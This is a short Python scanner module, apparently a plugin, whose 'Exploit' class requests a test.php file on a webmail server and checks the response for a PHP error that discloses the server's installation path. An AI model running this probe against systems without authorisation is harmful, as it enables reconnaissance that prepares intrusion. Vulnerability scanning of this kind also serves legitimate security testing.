# coding:utf-8
import requests
import re

class Exploit:

    def attack(self, url):
        path = '/webmail/client/mail/module/test.php'
        response = requests.get(url+path)

        if response.status_code == 200:
            m = re.match(r'a non-object in <b>(.*)\\client\\mail', response.content, re.S)
            if m:
                return url+path